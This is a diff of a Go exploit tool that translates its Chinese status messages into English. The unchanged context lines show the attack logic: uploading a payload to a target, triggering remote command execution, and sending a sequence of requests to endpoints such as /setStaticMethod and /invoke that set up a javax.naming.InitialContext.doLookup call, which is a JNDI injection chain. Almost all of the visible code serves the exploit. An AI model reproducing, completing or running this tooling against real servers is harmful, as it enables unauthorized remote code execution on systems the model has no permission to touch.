@@ -39,13 +39,13 @@ func Upload(url, b64_str string) {
 	resp, err := client.R().SetContentType("application/json").SetBodyString(jsonText).Post(tarGet)
 	if err != nil {
 		_ = err
-		fmt.Println("[-] 上传失败，请检查网络.")
+		fmt.Println("[-] Upload failure, please check network.")
 		os.Exit(0)
 	}
 	if resp.StatusCode == 200 {
-		fmt.Println("[+] 上传成功，开始命令执行.")
+		fmt.Println("[+] Upload success, try command execute.")
 	} else {
-		fmt.Println("[-] 上传失败，目标不存在漏洞.")
+		fmt.Println("[-] Exploit failure, There are no vulnerabilities in the target.")
 		os.Exit(0)
 	}
 
@@ -67,7 +67,7 @@ func Execute(url string) {
 	client.DisableKeepAlives()
 	resp, err := client.R().SetContentType("application/json").SetBody(jsonText).Post(tarGet)
 	if err != nil {
-		fmt.Println("[-] 命令执行失败，请检查网络.")
+		fmt.Println("[-] Command execution failed, Please check network.")
 		os.Exit(0)
 	}
 	_ = err
@@ -147,7 +147,7 @@ func send(url, uri, json_body string) {
 	resp, err := client.R().SetBodyJsonString(json_body).Post(url + base + uri)
 	if err != nil {
 		log.Fatal(err)
-		fmt.Println("[-] 连接失败，请检查网络.")
+		fmt.Println("[-] Connection failure, please check network.")
 		os.Exit(0)
 
 	}
@@ -155,19 +155,19 @@ func send(url, uri, json_body string) {
 		if resp.StatusCode == 200 {
 			return
 		} else {
-			fmt.Println("[-] 利用失败.")
+			fmt.Println("[-] Exploit failure.")
 			os.Exit(0)
 		}
 	}
 	if !strings.Contains(resp.String(), "result") {
-		fmt.Println("[-] 利用失败.")
+		fmt.Println("[-] Exploit failure.")
 		os.Exit(0)
 	}
 }
 
 func Exploit(url, payload string) {
 
-	fmt.Println("[*] 正在发送payload...")
+	fmt.Println("[*] Sending payload...")
 	uris := []string{"/setTargetObject", "/setStaticMethod", "/setTargetMethod", "/setArguments", "/prepare", "/invoke"}
 	send(url, uris[0], "{\"methodInput\": [null]}")
 	send(url, uris[1], "{\"methodInput\": [\"javax.naming.InitialContext.doLookup\"]}")
